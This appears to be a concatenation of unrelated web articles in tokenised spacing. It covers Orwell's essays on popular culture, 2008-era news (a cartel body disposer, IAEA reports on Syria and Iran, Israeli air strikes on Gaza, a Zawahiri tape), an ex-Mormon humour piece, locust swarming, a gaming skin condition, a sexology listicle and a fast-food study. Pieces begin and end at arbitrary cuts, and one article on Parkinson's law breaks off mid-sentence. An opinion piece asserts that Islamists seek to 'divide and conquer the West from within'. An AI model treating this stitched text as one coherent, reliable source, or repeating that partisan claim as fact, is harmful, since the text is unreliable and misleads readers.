And these essays , along with the others in All Art is Propaganda ( the " Critical Essays " ) , show Orwell moving from a catalog of pop culture to an analysis of it .
Two of them merit a longer look .
In " The Art of Donald McGill , " Orwell examines a popular set of post cards that feature simple sketches and jokes , " not witty but humorous . "
( Imagine Mad TV captioning New Yorker cartoons . )
While these postcards are " distinguishable from all the other kinds by having no artistic pretensions , " Orwell suggests that they form " a genre of their own . "
And Donald McGill , though Orwell seems unsure if he is a real person ( he was ) , stands as " the most representative , the most perfect in the tradition . "
Orwell goes on to treat these postcards as , well , a tradition .
In fact , he offers a detailed , almost Aristotelian breakdown , separating them into categories — Sex , Home Life , and Inter - working - class Snobbery , among others — and then , under each heading , offering examples and itemized lists of " Conventions " ( for example : " [ i ]
All drunken men have optical illusions " ) .
After such careful study — and Orwell balances observations both dry ( " a dominant motif in comic post cards is the woman with the stuck - out behind " ) and incisive ( " the McGill post card . . . is not intended as pornography but , a subtler thing , as a skit on pornography " ) — he abruptly turns to censorship .
" In England , the gap between what can be said and what can be printed is rather exceptionally wide . "
Because of this , Orwell says , " a whole category of humour , integral to our literature till 1800 or thereabouts , has dwindled down to these ill - drawn post cards . "
These postcards both point to a void and , in however lowbrow a fashion , fill it .
While he finds value in postcards , Orwell admits that they do n't tie directly into his pet causes .
Another essay , " Boys ' Weeklies , " reaches more serious conclusions .
Orwell 's case study is " the boys ' twopenny weeklies , " built on chunks of cheap fiction , often in 20,000 - word increments , about school life .
And yet : " The unreality of the Wizard and the Gem is not as artless as it looks . "
" Boys ' Weeklies " goes on to follow the same structure as " The Art of Donald McGill , " starting with an exemplar and then tracing its popularity .
While Orwell remains quite funny , he also raises the stakes : " I believe that most people are influenced far more than they would care to admit by novels , serial stories , films and so forth , and that from this point of view the worst books are of the most importance , because they are usually the ones that are read earliest in life . "
Throughout the essay , Orwell keeps a number of analytical threads alive and , somehow , untangled — classic weeklies vs. new ones , boys ' vs. women's , and detective stories vs. general audience .
He combs through ads and letters - to - the - editor , compares quotations between American and English versions , and regularly reads between the lines .
" The [ 1890s ] Boy 's Own Paper , " he claims , " used to have its correspondence columns full of terrifying warnings against masturbation . . . [ and ] heavy with homosexual feeling , though no doubt the authors were not fully aware of it . "
The most important point , for Orwell , is that these weeklies have survived 30 years without changing their characters or concerns .
He expects the weeklies to offer " a perfectly deliberate incitement to wealth - fantasy , " but their longevity changes the problem .
" Naturally the politics of the Gem and Magnet are Conservative , " he writes , " but in a completely pre-1914 style , with no Fascist tinge . "
This means the boys " get what they are looking for " — cowboys , death - rays , and so forth — " but they get it wrapped up in the illusions which their future employers think suitable for them . "
Orwell does n't always reach such broad conclusions .
In " Benefit of Clergy , " on Salvador Dali , Orwell suggests that , " in an age like our own , when the artist is an altogether exceptional person , he must be allowed a certain amount of irresponsibility , just as a pregnant woman is . "
( Orwell also turns to celebrities and their licenses in " Reflections on Gandhi . " )
In an essay on No Orchids for Miss Blandish , a contemporary crime novel that sold over a million copies , Orwell determines that " evidently there are great numbers of English people who are partly Americanised in language and , one ought to add , in moral outlook . "
It 's telling that , when discussing No Orchids , Orwell 's emphasis lands on the audience and not the author .
In each of these essays , Orwell works from the pop artifact to the masses , and this indicates what he 's trying to achieve , an analysis more sociological — and Orwell will occasionally use that word — than critical .
This strategy is n't perfect , as Orwell will sometimes explain a situation with a bit of easy - bake Marxism .
But it does keep his focus on the ephemeral , allowing him to argue what no one would deny today — that pop culture has a " message " too .
3 .
In 1946 , Secker & Warburg published Orwell 's Critical Essays , which included " The Art of Donald McGill , " " Boys ' Weeklies , " and eight other pieces .
Orwell 's letters leading up to the publication reveal both his careful editing — " Page 7 , lines 13 - 16 .
Delete ' bourgeois ' and substitute ' middle - class ' " — and his squabble with the American publisher over the title .
" I do n't approve of these catchy titles , " says Orwell , " but I should think TO MAKE A SHORT STORY LONG is a just possible title , not completely unconnected with the subject - matter of the book .
THE FACE BEHIND THE PAGE is another possible one and refers to something in the text . "
The reference is to a line in Orwell 's essay on Dickens , so perhaps the Americans viewed their final choice as a compromise : Dickens , Dali & Others : Studies in Popular Culture .
When he died , Orwell left behind a notebook , in which he penciled the decidedly uncatchy " Reprintable Essays Etc , " containing ideas for another volume of nonfiction .
Predictably enough , publishers issued at least a half dozen different collections in the first decade after his death , with 1954's A Collection of Essays coming out on top .
That book remains the primary option today , and this suggests why Packer 's new two - volume set is so important .
While more comprehensive editions exist , none balance broad selection with mass - market appeal so well as Packer's .
Of course , his edition foregrounds the Orwell We Know .
The titles depend on unrepentant individualism ( Facing Unpleasant Facts ) and habitual overstatement ( All Art is Propaganda ) ; their back covers are dominated by large , imposing images of The Author .
But these details seem to be mostly for show , a brash invitation in the door .
Once inside , you still find Orwell 's wide range of interests .
In fact , one could pick a theme other than pop culture — childhood , say , or even high - brow culture — and link together Orwell 's essays in much the same way .
( How else would you explain an essay like " Lear , Tolstoy , and the Fool , " where Orwell defends Shakespeare from Tolstoy 's obscure attack ? )
Also , and importantly , these are stylish , handsome books , with artfully worn covers and deckle - edge paper .
They feel like something that 's been circulating among all the right people .
I should add that Packer and Gessen both submit perceptive essays , though , to me , they work best as something to read after Orwell , as a way to process or detox .
So , if you want to take Orwell to the beach , then a second - hand Collection of Essays should fit snuggly between your flip - flops and Coppertone .
But , if you want a broader , truer encounter with Orwell — or if you want to lend a bit of bookshelf gravitas to your own comparisons between " Politics and the English Language " and our current political scene — then buy ( and read ) these books .
LONDON , Nov. 28 ( UPI ) --
The struggles associated with a credit crunch have been suffered by other societies in history -- just look at the Roman republic , a British historian says .
Oxford University historian Phillip Kay said the first - ever recorded credit crunch took place in 88 B.C. , when a civil war decimated the Roman economy and credit system , The Guardian ( Britain ) said Friday .

Kay noted comparisons between the current credit crunch facing Britain and other parts of the world and such historical struggles .
" The essential similarity between what happened 21 centuries ago and what is happening in today 's U.K. economy is that a massive increase in monetary liquidity culminated with problems in another country causing a credit crisis at home , " he said .
While Kay has found a link between the historic crisis and today 's current economic situation , he admits there is little to learn from the Roman debacle .
There 's very little information about what happened over the next 20 years I 'm afraid , " Kay said , referring to how the Roman republic rebounded from its credit crunch .
" We just do n't know . "

Mr Meza says he " did n't feel anything " when getting rid of the bodies A man arrested by Mexican police says he disposed of 300 bodies for a drugs gang over the past decade by dissolving them in chemicals .
Santiago Meza , called the " stew maker " , said he was paid $ 600 ( £ 440 ) a week to dissolve the bodies of murdered rival gang members in caustic soda .
He was presented to the media by the Mexican army after being arrested on Thursday near the city of Tijuana .
Over 700 people died in the US border city last year in an ongoing drugs war .
The Mexican army says it believes Mr Meza 's claims are true .
" They brought me the bodies and I just got rid of them , " Mr Meza told journalists at a construction site where he disposed of the bodies over a 10 - year period .
" I did n't feel anything . "
The 300 corpses were said to belong to murdered rivals of Mexican drug kingpin Teodoro Garcia Simental , who is battling for control over drug trafficking routes through Tijuana , after defecting from the powerful Arellano Felix cartel .
Mr Meza was quoted by AP news agency as saying that he " would apologise " if he could speak to relatives of the victims .
Mexico 's drug violence has surged and grown more gruesome in recent years , particularly in the northern border cities of Tijuana and Ciudad Juarez .
Also on Friday , two human heads were found inside coolers near police stations in the central Guanajuato state , officials said .
The heads were accompanied by a note threatening allies of the " La Familia " drug cartel .
Drug -related violence claimed 5,700 lives across Mexico last year , more than double the number of victims in 2007 .

Syria has blocked further visits by UN nuclear inspectors
The UN nuclear agency says it has found additional particles of uranium in samples taken from the site of an alleged nuclear facility in Syria .
Syria denied the site was a nuclear reactor and alleged the uranium traces found there came from Israeli missiles fired on it in September 2007 .
But the International Atomic Energy Agency said the probability of the uranium coming from missiles was low .
The IAEA called on Syria to co-operate more with its inquiry .
Nuclear suspicions
It said Syria had not answered many of the agency 's questions about the destroyed facility .
Israeli warplanes flattened the facility in the Syrian desert in 2007 on suspicion that it was part of a covert nuclear weapons programme .
The report for the IAEA board members has been seen by news agencies ahead of a meeting to discuss Syria next week .
It said IAEA inspectors had been blocked from making follow - up visits to the site .
The latest report comes after a November report said the site had features resembling those of a nuclear reactor site , but it did not exclude the possibility that it was being used for purposes unrelated to nuclear activity .
In that first report on its findings , the IAEA said " significant " traces of uranium were also found .
Syria has always maintained the site was a disused military building .
Iran report
The IAEA also reported on Thursday that Iran has slowed the expansion of its uranium enrichment plant but had built up its stockpile of nuclear fuel .
The agency said Iran had only slightly increased the number of centrifuges refining uranium - a process that can produce fuel for civilian energy or atomic weapons .
But Iran 's reported stockpile of low - enriched uranium had risen to 1,010kg .
Unnamed IAEA officials briefed journalists that this amount of uranium was sufficient , with added purification , to make an atom bomb .
Iran insists its nuclear programme is for civilian purposes only .
Iran 's continued enrichment of uranium is in defiance of UN Security Council resolutions .

Advertisement Israeli F - 16 bombers have pounded key targets across the Gaza Strip , killing at least 225 people , local medics say .
Most of those killed were policemen in the Hamas militant movement , which controls Gaza , but women and children also died , the Gaza officials said .
About 700 others were wounded , as missiles struck security compounds and militant bases , the officials added .
Israeli PM Ehud Olmert said the operation " may take some time " - but he pledged to avoid a humanitarian crisis .
" It 's not going to last a few days , '' he said in a televised statement , flanked by Israeli Defence Minister Ehud Barak and Foreign Minister Tzipi Livni .
Israel said it was responding to an escalation in rocket attacks from Gaza and would bomb " as long as necessary " .
Gaza : World reaction in quotes Gaza raids :
Your reaction
They were the heaviest Israeli attacks on Gaza for decades .
More air raids were launched as night fell .
Staff at the main hospital in Gaza say operating rooms are overflowing , it is running out of medicine , and there are not enough surgeons to cope .
The raids came days after a truce with Hamas expired .
Israeli Defence Minister Ehud Barak said " there is a time for calm and a time for fighting , and now the time has come to fight " .
But the exiled leader of Hamas , Khaled Meshaal , called for a new intifada , or uprising , against Israel , in response to the attacks .
The movement 's Gaza leader , Ismail Haniyeh , said there would be no white flags and no surrender .
" Palestine has never witnessed an uglier massacre , " he said .
Israel hit targets across Gaza , striking in the territory 's main population centres , including Gaza City in the north and the southern towns of Khan Younis and Rafah .
Mr Olmert said " we tried to avoid , and I think quite successfully , to hit any uninvolved people - we attacked only targets that are part of the Hamas organisations " .

In pictures : Gaza attack aftermath UK concern over Gaza raid Malnutrition and shortages in Gaza Israel warns Hamas over rockets Hamas said all of its security compounds in Gaza were destroyed by the air strikes , which Israel said hit some 40 targets .
Hamas vowed to carry out revenge attacks on Israel and fired Qassam rockets into Israeli territory as an immediate reply .
One Israeli was killed by a rocket strike on the town of Netivot , 20 kilometres ( 12 miles ) east of Gaza , doctors said .
Ceasefire urged
The air strikes come amid rumours that an Israeli ground operation is imminent .
Israeli television said on Saturday evening that Israeli troops were massing on the Gaza border " in preparation for a supplementary ground offensive " .
The report has not been confirmed by independent sources .
US Secretary of State Condoleezza Rice accused Hamas of having triggered the new bout of violence .

" The United States is deeply concerned about the escalating violence in Gaza , " she said in a statement .
" We strongly condemn the repeated rocket and mortar attacks against Israel and hold Hamas responsible for breaking the ceasefire and for the renewal of violence there .
The ceasefire must be restored immediately and fully respected . "
UN Secretary - General Ban Ki-moon also urged an immediate halt to the violence , condemning what he called Israel 's " excessive use of force leading to the killing and injuring of civilians " and " the ongoing rocket attacks by Palestinian militants " .
Calls for a ceasefire also came from Middle East envoy Tony Blair and the French EU presidency .
Hamas bases destroyed Palestinian militants frequently fire rockets against Israeli towns from inside the Gaza Strip ; large numbers of rocket and mortar shells have been fired at Israel in recent days .

A Hamas police spokesman , Islam Shahwan , said one of the Israeli raids targeted a police compound in Gaza City where a graduation ceremony for new personnel was taking place .
At least a dozen bodies of men in black uniforms were photographed at the Hamas police headquarters in Gaza City .
Most of the dead and injured were said to be in Gaza City .
The head of Gaza 's police forces , Tawfik Jaber , was among those killed .
Mr Olmert appealed to Palestinians in Gaza , saying " You - the citizens of Gaza - are not our enemies .
Hamas , Jihad and the other terrorist organisations are your enemies , as they are our enemies .
" They have brought disaster on you and they try to bring disaster to the people of Israel .
And it is our common goal to make every possible effort to stop them . "
It is the worst attack in Gaza since 1967 in terms of the number of Palestinian casualties , a senior analyst told the BBC in Jerusalem .
Mosques issued urgent appeals for people to donate blood and Hamas sources told the BBC's Rushdi Abou Alouf in Gaza that hospitals were soon full .
In the West Bank , Palestinian Authority President Mahmoud Abbas - whose Fatah faction was ousted from Gaza by Hamas in 2007 - condemned the attacks and called for restraint .
Egypt opened its border crossing to the Gaza Strip at Rafah to absorb and treat some of those injured in the south of the territory .
Palestinians staged demonstrations in the West Bank cities of Ramallah and Hebron , and there were some scuffles with Israeli troops there .
Although a six - month truce between Hamas and Israel was agreed earlier this year , it was regularly under strain and was allowed to lapse when it expired this month .
Hamas blamed Israel for the end of the ceasefire , saying it had not respected its terms , including the lifting of the blockade under which little more than humanitarian aid has been allowed into Gaza .
Israel said it initially began a staged easing of the blockade , but this was halted when Hamas failed to fulfil what Israel says were agreed conditions , including ending all rocket fire and halting weapons smuggling .

A sandpit roughly the size of an Olympic pool , with four walls about two metres high pushed together by bulldozers , dominates one field .
According to Mr Dayer , and several other residents whose houses bordered the field , Israeli troops quickly evacuated the surrounding houses .
" They entered my house with a tank , " Mr Dayer said .
" I was told to come outside with my family . "
Told to strip to his underwear , Mr Dayer said his hands were tied behind his back with white plastic cables , then he was moved into the sandpit area .
Mohammed Madhoun , 22 , a media and public relations student at the Al - Aqsa University , whose home is across a laneway from Mr Dayer 's home , said he and his parents were ordered to do the same .
" I was told to take off my clothes by one soldier , told to put them on again by another , and then take them off again .
My hands were tied and I was taken into this area , " Mr Madhoun said , pointing to the sandpit .
Ali Ajramy , 39 , a tailor , thrust his hands forward to show the sores on his wrists caused by plastic cables " I was taken into this prison , " he said .
" And I was told to be quiet and kneel down . "
The three were among about 85 men who were moved into the sandpit area and gathered at the western end .
They said the Israeli troops then took position around perimeter of the sandpit area and began to engage with Palestinian resistance fighters .
" We kept our heads down , we did n't move for two days , " Mr Madhoun said .
" There was lots of shooting over our heads but I do n't know where it was coming from .
We were given blankets and food . "
Empty cans of Israeli rations litter the sandpit .
The soldiers dug several foxholes .
" After two days we were taken to Beersheva , in Israel , " Mr Dayer said .
" We were there for five days and then brought back to Gaza and freed . "
He showed Herald a release form in Hebrew , given when they were returned to Gaza .
An Israeli spokesman told Herald it did not comment on operational matters .
But he stressed the Israeli military does not use anyone as " human shields " .
The deputy director of the Palestinian Centre for Human Rights , Jaber Jishah , said it appeared a textbook example of human shields .
" We are investigating this very thoroughly , " he said .
“ Parkinson ’s law ” , first published in an article of 1955 , states : work expands to fill the time available for its completion .
Is it more than just a cynical slogan ?
( Image : OJO Images / Rex Features )
IT IS 1944 , and there is a war on .
In a joint army and air force headquarters somewhere in England , Major Parkinson must oil the administrative wheels of the fight against Nazi Germany .
The stream of vital paperwork from on high is more like a flood , perpetually threatening to engulf him .
Then disaster strikes .
The chief of the base , the air vice - marshal , goes on leave .
His deputy , an army colonel , falls sick .
The colonel ’s deputy , an air force wing commander , is called away on urgent business .
Major Parkinson is left to soldier on alone .
At that point , an odd thing happens – nothing at all .
The paper flood ceases ; the war goes on regardless .
As Major Parkinson later mused : “ There had never been anything to do .
We ’d just been making work for each other . ”
That feeling might be familiar to many working in large organisations , where decisions can seem to be bounced between layers of management in a whirl of consultation , circulation , deliberation and delegation .
It led Major Parkinson – in civilian dress , C. Northcote Parkinson , naval historian , theorist of bureaucracy and humorist - to a seminal insight .
This is “ Parkinson ’s law ” , first published in an article of 1955 , which states : work expands to fill the time available for its completion .
Is there anything more to that “ law ” than just a cynical slogan ?
Physicists Peter Klimek , Rudolf Hanel and Stefan Thurner of the Medical University of Vienna in Austria think …
Perhaps the largest source of sporadic anger in my life is the past I share with The Church of Jesus Christ of Latter Day Saints , more commonly referred to as “ Mormonism . ”
Since leaving the fold some 9 years back , my attitude was akin to unbridled , faith ruining fury , played out in fantasies where I soar from temple to temple , exploding holy structures with the mere suction of my mighty leaps , like Ang Lee ’s HULK .
However with age , comes wisdom , and I ’ve learned that my time is better spent not imagining super hate crimes .
Instead I settle for a passively deep pity for those who still believe , and save the rage for family gatherings and Prop 8 news .
So the beast lay buried , until two fresh - faced missionaries approached me on a day ending trip from job to truck .
“ Would you mind if we shared a message with you ? ” I obliged , figuring the walk to be a short one , and hoping at some point to let these boys down gently , that I might head home directly to smoke pot and watch Simpson ’s reruns in prodigal peace .
Heck , maybe the message was even something I needed to hear , like “ do n’t forget to pick up eggs , ” or “ get that sore checked out . ”
I listened to their faithful re-pitching of the religion I once knew , much the same way an adult might listen to a 5 year old excitedly describe pizza .
( “ … and there can be pepperoni on it … and when you die you go to a heaven planet … ” ) .
Were I to rejoin , I ’d be like Cypher from the Matrix , played by the incomparable Joe Pantoliano , turning my back on reality to live an ignorantly comfortable life .
I told them of my history , and how I hoped to write a movie about the faith so jarring , my parent ’s would finally see the truth and leave the church .
They likened my story unto “ Alma , ” who “ murdered people with his words . ”
I felt vaguely flattered , and followed up with “ Well call it what you will , but basically , I do n’t need an unseen force to dole out my mercy and shame , as I am perfectly capable of doing that myself . ”
They blinked at me like stunned puppies , and finally offered to come by sometime and show me how to make milkshakes .
“ No thanks , ” I responded .
“ I ’ll just ask the Internet . ”
They bid goodbye , and I am still lonely .
And most importantly without a good technique for making milkshakes .
December 1 , 2008  --
Al Qaeda 's number two man , Ayman al Zawahiri , has surfaced again , this time in the form of an audio tape released this morning by as - Sahab , al Qaeda 's media arm .
In the 22 minute audio tape , titled " Martyrdom of Heroes " and released on jihadist web forums , Zawahiri commemorates the deaths of three Bali bombers who were executed by firing squad over three weeks ago in Indonesia .
Amrozi Nurhasyim , Ali Gufron and Imam Samudra had been convicted of bombing two Bali nightclubs in 2002 , killing 202 people , including eight Americans .
" They knew the price and paid it gladly with no struggling , " Zawahiri says of the bombers in the tape .
" They put up with a long journey of torture and prison and they took the verdict happily .
They went to God proud refusing to apologize . "
Zawahiri Still Does Not Mention Mumbai Attacks
Zawahiri last appeared Nov. 28 in a video released to jihadist web forums , in which he criticized the U.S. and its activity in Afghanistan and Iraq and discussed the state of jihad .
Neither message made any mention of the attacks in Mumbai that have terrorized the city , which means the tape was most likely made before the attacks last week .
Experts say that messages from al Qaeda typically take at least once week to make it to these message forums once they are made , and they expect that there will be some type of comment on the Mumbai attacks .
" He 's still going to come out in the next couple of weeks , " former CIA officer and ABC News Consultant John Kiriakou said of Zawahiri and the expectation that he will comment on Mumbai .
Kiriakou said that in such a statement , Zawahiri will likely threaten similar attacks elsewhere .
" He did it after the London bombings , he did it after the Madrid bombings , and he 's going to do it again , " said Kiriakou .
He explained that because al Qaeda uses a network of couriers to release message , for their own internal security , news is slowly released .
" They do n't want anyone to be able to trace locations by reverse engineering the courier system , " Kiriakou said .

Keysar Trad , the controversial founder of Australia 's Islamic Friendship Society , is very upset .
At the opening of a prayer center last week , he accused local officials of erecting excessive barriers to the construction of Islamic facilities .
When Muslims are not permitted to build where they wish , he said , the governments effectively are " forcing people to go to one particular area , even though they do n't live in that particular area . "
This , Trad argued , imposes a " ghetto " mindset on a community that has been " very resistant to ghettoization . "
No word yet on whether he is peeved with Muslims from the Islamic Council of Western Australia , which not only desires segregation , but works to bring it about .
Its plan to include Muslim - only housing in a $ 10 million complex is troubling enough .
Far worse is the warped logic behind the endeavor :
[ Spokesman ]
Ghauri rejected claims the housing would further isolate sectors of the Muslim community from mainstream society , claiming the venue would be used to teach Islamic youth how to become good Australian citizens .
And the council 's religious adviser , Abdul Jalil Ahmad , said it was useful for different religious or ethnic groups to have separate residential enclaves so their customs and exotic cooking smells did not offend neighbors .
" It 's ideal for any ethnic group because you can deal with each other in an easier way , " Mr. Ahmad said .
" In South Africa , because of apartheid , all different communities were set up and it worked well .
It kept people separate .
We can be together in terms of our contribution to the wider community . "
Not only does the hierarchy insist that segregation somehow aids the integration process ; it also views apartheid - era South Africa as an intercultural golden age and model for the future .
Blacks who lived through those decades as second - class citizens might disagree with the notion that apartheid " worked well " for them .
Ramdas Sankaran , president of the Ethnic Communities Council , rightly called the plans for segregated housing a " deplorable " idea that would damage societal cohesion .
" Self - exclusion is just as bad as being excluded by other parties in Australia , " he said .
" It 's not in the interests of any group . "
But Sankaran is wrong on one point .
Self - exclusion is very much in the interests of Islamists who wish to divide and conquer the West from within .
And that is why separatism must be discouraged wherever it appears , from a " black Muslim enclave " in Philadelphia , to a series of no - go zones in Great Britain , and now to a proposed Muslim - only residence in Australia .

Swarms can devastate crops and cause serious economic hardship
It is one of nature 's most radical transformations - the moment a crowd of harmless desert locusts begins to swarm into a devastating plague .
Now scientists from the UK and Australia say they have discovered the trigger - the brain chemical serotonin .
The molecule is best known in humans as a target of anti-depressant drugs .
The discovery could lead to new control strategies for the pests , which plague 20 % of the world 's land , they write in Science journal .
Desert locusts are known to swarm by the billions , inflicting severe hardship on farmers in parts of Africa , China and other areas .
But the insects actually spend much of their life in a harmless , " solitary " phase .
To find that serotonin is what causes a normally shy , antisocial insect to gang up in huge groups is amazing
Dr Swidbert Ott ,
Cambridge University
When food runs short , they slowly become clustered together and enter their " gregarious " phase , culminating in an aggressive swarm .
Prior to swarming , the locusts undergo a series of dramatic physical changes - their body colour darkens and their muscles grow stronger .

To find out the chemical signal that triggers this metamorphosis , scientists from Oxford University , Cambridge University and Sydney University began monitoring locusts in the laboratory .
They triggered the gregarious behaviour by tickling the beasts ' hind legs , to simulate the jostling they experience in a crowd .
They found that locusts behaving the most gregariously ( in swarm - mode ) had approximately three times more serotonin in their systems than their calm , solitary comrades .
" The question of how locusts transform their behaviour in this way has puzzled scientists for almost 90 years , " said co-author Dr Michael Anstey , from Oxford University .
" We knew the [ physical ] stimuli that cause locusts ' amazing Jekyll and Hyde - style transformation .
Gregarious locusts ( L ) and solitary ( R ) were once thought to be different species
" But nobody had been able to identify the changes in the nervous system that turn antisocial locusts into monstrous swarms .
" Now we finally have the evidence to provide an answer . "
The team say their finding opens up a new idea for a locust control strategy - a chemical that inhibits serotonin and thus converts swarming locusts back to their solitary phase .
In humans , by contrast , keeping serotonin levels high is the aim of many anti-depressant drugs .
" Serotonin profoundly influences how we humans behave and interact , " said co-author Dr Swidbert Ott , from Cambridge University .
" So to find that the same chemical is what causes a normally shy , antisocial insect to gang up in huge groups is amazing . "

LONDON ( Reuters ) - Gamers beware : Keeping too tight a grip on the console and furiously pushing the buttons can cause a newly identified skin disorder marked by painful lumps on the palms , Swiss scientists said on Tuesday .

Called “ PlayStation palmar hidradentitis ” by the scientists , the skin disorder can cause painful lesions on the palms similar to patches found on the soles of children ’s feet after taking part in heavy physical activity , they said .
“ The tight and continuous grasping of the hand - grips together with repeated pushing of the buttons produce minor but continuous trauma to the ( palm ) surfaces , ” Vincent Piguet and colleagues at University Hospitals and Medical School of Geneva reported in the British Journal of Dermatology .
A spokesman for Sony Corp , which makes the PlayStation , noted the study involved one person and said the company had sold hundreds of millions of the consoles since the product was introduced in 1995 .
“ As with any leisure pursuit there are possible consequences of not following common sense , health advice and guidelines , as can be found within our instruction manuals , ” Sony spokesman David Wilson said .
“ We would not wish to belittle this research and we will study the findings with interest , but this is the first time we have ever heard of a complaint of this nature . ”
Excessive gaming is already seen as a public health issue , sparking addictive behavior that can lead to a range of psychological problems , the researchers said .
Other researchers have identified acute tendonitis from playing too much of Nintendo Co Ltd ’s Wii , and now a disorder related to the PlayStation can be added to the list , the team said .
Their study described the case of a 12 - year - old girl who attended the Geneva hospital with intensely painful lesions on her hands , which she had developed four weeks earlier .
She had no other lesions anywhere else on her body .
After questioning , the doctors discovered that several days prior to the appearance of the lesions the girl had started to play a game on her PlayStation for several hours each day .
The researchers suspected that grasping the console ’s hand - grips together with repeated pushing of the buttons produced minor but prolonged injury to the palm of the girl ’s hands , which can be made worse by sweating during a tense game .
The doctors recommended the girl stop playing and she recovered fully after 10 days , the researchers said .
“ If you ’re worried about soreness on your hands when playing a games console , it might be sensible to give your hands a break from time to time , and do n’t play excessively if your hands are prone to sweating , ” Nina Goad of the British Association of Dermatologists said in a statement .

Sexology , or the study of human sexuality , is a science at the nexus of biology , neurology , psychology and sociology .
And like any science , sexology has its eureka moments .
Here are some of the biggest .

These breakthroughs are roughly in chronological order .

Non-procreative sexual behavior is common
In 1886 , a psychiatrist named Richard von Krafft - Ebing revolutionized the discipline of sexology by publishing his exhaustively researched tome Psychopathia Sexualis .
He 'd documented every case he could find of what he called " sexual perversity , " including those he 'd encountered first - hand among his patients .
He defined sexual perversity as pretty much anything that deviated from procreative , heterosexual sex , and put each perversion into its own special category .
Though he intended to document perversity , the book had the opposite effect :
Many doctors and ordinary people read it and realized that many kinds of " perversity " were so common that they were almost normal .
The ( relatively ) unbiased reporting and taxonomic structure of Krafft - Ebing 's book inspired countless other early - twentieth - century researchers , including Sigmund Freud , Magnus Hirschfeld , and Alfred Kinsey .
Though published over a century ago , Psychopathia still has the power to shock .

Bisexuality exists
Sigmund Freud , the father of modern psychiatry , is famous for remarking that everyone is bisexual .
His idea was remarkable for two reasons .
One , it acknowledged that there was a middle position between gay and straight ( a relatively rare belief among doctors ) ; and two , it paved the way for a more nuanced understanding of how sexuality exists on a continuum rather than as a binary system .
Jumping off from Freud 's idea , infamous twentieth century sex researcher Alfred Kinsey created what has come to be known as the Kinsey Scale for sexual orientation .
On that scale , 0 is completely heterosexual and 6 is completely homosexual .
Kinsey and his colleagues did decades of in - depth research to determine that most people fall somewhere in the middle of the scale .
You can see their research in Kinsey 's most famous works : Sexual Behavior in the Human Male and Sexual Behavior in the Human Female .
All research was based on thousands of anonymous interviews conducted all over the United States .

Medical science can transform men into women , and vice versa
Throughout recorded history , there have been women who lived as men and vice versa .
Many cultures even have the idea of a " third sex , " often a shamanistic role , which is for people who are neither male nor female .
But it was n't until 1930 that the first sex change operation was performed on a famous Dutch artist named Einar Wegener , who emerged as the woman Lili Elbe .
Unfortunately , the operation was crude - it involved implanting ovaries - and she eventually sickened and died ( you can read her intriguing memoirs about her transition ) .
The first successful male - to - female sex change operation was performed in Denmark in 1952 , and its recipient , Christine Jorgensen , became an international celebrity .
Since then , thousands of people have had successful sex reassignment surgeries , moving from female to male and male to female with the assistance of medical science .

Women have orgasms
The female orgasm has been " discovered " several times over the past 130 years .
In the nineteenth century , doctors used vibrators to help relieve women of " hysteria , " though almost no medical accounts from the time acknowledge that this therapy was basically masturbation .
The Victorian Era had given rise to the myth that women did n't have orgasms , and many medical researchers adopted this idea as truth because it was impossible to prove that women were orgasming the way you could prove men were .
Though anecdotal reports and throughout the twentieth century indicated women could orgasm the way men could , it was n't until the experiments of sexologists William Masters and Virginia Johnson in the late 1950s that the female orgasm was finally proven to exist in a scientific manner .
Masters and Johnson observed women in the process of orgasming while monitoring everything from blood flow to muscle spasms in their vaginas .
( Yes , they actually inserted a dildo - shaped measuring device into the women 's vaginas to do their research . )
After Masters and Johnson published their research in 1966 , several other researchers investigated women 's sexual response cycle , quickly discovering the G - spot , female ejaculation , and even looking at orgasming women in MRI machines ( you can see a picture of that at the top of this post ) .
Recent research into female orgasm has focused on the neurochemistry of women 's brains while they are aroused .

Pregnancy can be prevented with a pill
In 1960 , the birth control pill debuted on the market as a contraceptive for women .
In the late 50s it had been prescribed to women who suffered extreme menstrual cramps .
But in the early 60s the pharmaceutical known as " the Pill " became not just a sexology discovery but shorthand for a sexual revolution that had more to do with culture than science .
Freed from cumbersome birth control devices like condoms that depended on male cooperation , women could suddenly have sex without the constant worry that they would become pregnant .
Many historians have argued that the Pill helped start a new wave of feminist consciousness .
The Pill is an excellent example of how a scientific discovery can have widespread , unintended social consequences .
Homosexuality is not a disease
In 1973 , homosexuality was removed from the Diagnostic and Statistical Manual of Mental Disorders ( DSM - II ) .
That meant that after decades of debate , the professional psychiatric community would no longer treat homosexuality as a disease .
Certainly an unhappy homosexual might be viewed as neurotic , but a happy , well - adjusted gay person would be given a clean bill of health .
Many sexologists had been arguing for decades that homosexuality was not a disease , most notably the openly gay psychiatrist Magnus Hirshfeld , who founded the Berlin Institute for Sexology ( which was later burned down by the Nazis ) .
But the removal of homosexuality from the DSM made it official : Licensed doctors now agreed that gayness on its own was not an illness .

Many kinds of male impotence can be cured with a pill
In 1998 , men got their own version of the Pill .
A chemical called sildenafil citrate came to market under the name Viagra .
Sildenafil works by relaxing muscle tissues , allowing more blood to flow into the penis .
Just as the Pill liberated women from fears of pregnancy , Viagra liberated many men from fears of impotence .
While sildenafil did n't set off a cultural revolution , it did represent a major scientific breakthrough - and has helped researchers understand male sexuality better .
Viagra and similar drugs like cialis are among the bestselling " lifestyle pharmaceuticals " of all time , raking over 1.5 billion dollars per year .

Orgasms can be caused via direct neural stimulation of the spinal cord
In 1998 , the same year Viagra hit the market , Dr. Stuart Meloy made a strange discovery while operating on a woman 's spinal cord .
He was stimulating her nerves in order to locate the source of her back pain , and when he hit one particular nerve he gave her an instant orgasm .
" You should teach my husband to do that , " she told him .
Meloy went on to patent a spinal implant device , which he hopes to market as a cure for female sexual dysfunction ( i.e. , an inability to have orgasms ) .
He 's in the process of testing the device now , and is actively seeking volunteers - female and male - so that he can perfect the device and bring it to market .
Once he's got a version of the device that people can use easily , you can expect a sexual revolution that will make the Pill look like a walk in the park .

Women ovulate more than once per month
In 2003 , a researcher named Roger Pierson at the University of Saskatchewan overturned the almost century - old scientific belief that women ovulate once a month .
He and his team used simple ultrasound scans on 63 women with normal menstrual cycles , and discovered that a significant number of them ovulated 2 or 3 times per month .
Their finding could have a significant impact on how we understand female hormonal cycles and fertility .

The results of a new study published in " Reviews of Agricultural Economics " show that both , fast food and table service meals offered at restaurants feature more calories than the food prepared at home .
At the same time the study showed that fast food has fewer calories than meals from a table service restaurant .
Researcher James K. Binkley of Purdue University analyzed the information provided by the U.S. Department of Agriculture Continuing Survey of Food Intakes by Individuals .
The data is the latest large sample of information about nutritional intake .
Binkley focused his research on comparing fast food , meals served at table service restaurant meals , and food prepared at home .
He discovered that fast food was more energy dense in comparison with meals made at a table service restaurant .
